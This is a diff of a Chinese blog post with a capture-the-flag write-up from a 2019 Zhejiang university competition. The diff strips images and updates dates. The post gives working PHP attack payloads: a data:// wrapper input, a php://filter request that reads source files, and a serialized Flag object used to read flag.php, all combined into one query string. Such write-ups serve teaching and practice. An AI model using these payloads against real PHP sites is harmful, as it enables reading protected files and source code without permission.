@@ -54,17 +54,11 @@
 <meta property="og:site_name" content="Chen&#39;Blog">
 <meta property="og:description" content="浙江省大学生网络安全竞赛：逆转思路这题当初没做出来，可惜了就拿个二等奖。主要是php序列化，以及data协议。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chenzidu.github.io/1.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/3.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/4.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/5.jpg">
 <meta property="article:published_time" content="2019-12-07T12:07:38.000Z">
-<meta property="article:modified_time" content="2022-12-11T09:31:21.953Z">
+<meta property="article:modified_time" content="2024-03-11T07:48:09.670Z">
 <meta property="article:author" content="ChenZIDu">
 <meta property="article:tag" content="PHP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://chenzidu.github.io/1.jpg">
 
 <link rel="canonical" href="https://chenzidu.github.io/2019/12/07/2019-ZJCTF/">
 
@@ -256,7 +250,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+                <time title="修改时间：2024-03-11 15:48:09" itemprop="dateModified" datetime="2024-03-11T15:48:09+08:00">2024-03-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -330,14 +324,17 @@
 <p>data:&#x2F;&#x2F;协议允许读入</p>
 <p>第一关payload：</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">text</span>=data://text/plain<span class="comment">;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>
-<p><img src="/1.jpg"></p>
+
+
 <h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p>
 <h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>利用filter来进行读取指定文件，因为提示有说useless.php</p>
 <p>payload:</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
 <p>读取后进行base64解码</p>
-<p><img src="/2.jpg"></p>
-<p><img src="/3.jpg"></p>
+
+
+
+
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 <h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>将flag调用，然后给里面file值为flag.php。<br>序列化后传入password，应该就会出flag。</p>
 <p>以下是我自己写的php序列化</p>
@@ -346,9 +343,9 @@
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Flag"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
 <p>将三关payload综合起来：</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:"Flag":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">8</span>:"flag.php";&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/4.jpg"></p>
+
+
 <p>F12找到flag</p>
-<p><img src="/5.jpg"></p>
 
     </div>
 
